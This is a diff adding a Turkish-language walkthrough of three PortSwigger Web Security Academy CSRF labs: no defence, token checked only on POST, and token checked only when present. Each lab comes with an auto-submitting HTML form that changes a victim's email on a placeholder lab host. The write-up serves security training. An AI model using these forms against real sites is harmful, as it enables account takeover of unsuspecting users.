@@ -1,0 +1,44 @@
+#### CSRF güvenlik profil ve email gibi güncellemeler sonucunda meydana gelmektedir. Sebebi başlıklar halinde açıklamalarıyla portswigger örnekleriyle aşağıda listelenmiştir.
+Temelde olan güncelleme yapılırken bir form etiketi içerisinde giden verilerin manipüle edilebiliyor olmasıdır.
+Basit bir html sayfası oluşturup içerisine form verilerini değiştirerek submit aracılığı ile sunucuya iletebiliyorsak zafiyet gerçekleşmiş olur.
+
+1
+Savunması olmayan CSRF zafiyeti
+
+mail güncelledikten sonra csrf koruması yoksa aşağıdaki kodları exploit serverde çalıştırarak labı çözeriz.
+
+<form method="POST" action="https://$yourlabid.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="qwe@qwe1.c">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+
+2
+Lab: Token doğrulamasının istek yöntemine bağlı olduğu CSRF
+Bu labta csrf tokeni koruması var ancak sadece post metoduna uygulanmış o yüzden get metoduna çevirerek isteğin csrf doğrulamasına sahip olmadığını farkediyoruz.
+
+
+exploit server store ve deliver to victim ile çözüyoruz. Ayarlağımız POC'de form kısmında methodun uygulanmadığına dikkat edin.
+
+<form action="https://$yourlabid.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="hacker@hacker1.co">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+
+
+3
+Laboratuvar: Token doğrulamasının tokenin mevcut olmasına bağlı olduğu CSRF
+
+csrf parametresini silip sen to request dediğimizde isteğin sunucudan kabul edildiğini gözlemliyoruz.
+
+<form method="POST" action="https://$yourlabid.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="qwe@2qwe.c">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
